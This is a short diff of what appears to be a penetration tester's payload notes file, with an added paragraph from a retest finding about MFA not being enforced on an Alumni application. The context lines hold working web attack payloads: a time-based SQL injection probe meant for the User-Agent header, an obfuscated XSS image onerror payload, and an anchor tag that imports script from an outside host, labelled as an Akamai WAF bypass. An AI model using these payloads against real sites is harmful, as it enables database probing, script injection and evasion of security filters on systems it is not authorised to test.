@@ -57,4 +57,6 @@ XOR(if(now()=sysdate(),sleep(5),0))XOR --> also try in user-agent
 <img//////src=x oNIY=1 oNerror=alert('xxs')//
 
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>. --> Bypass Akamai
-pRvVbUmSYw7UbCoVJ3IZ9Gj9kmkaQwiUvktkfYTfq8c3YkrcbjL31QUsVZv3rC0o3A4JjTAGmM8mNoorPw85Q
+The below justification was previously provided to support downgrading M6. However, during retesting, we observed that MFA is not implemented correctly.
+
+For the Alumni application, even after MFA is configured for the account, the application does not prompt for an MFA code during login or after a password reset.
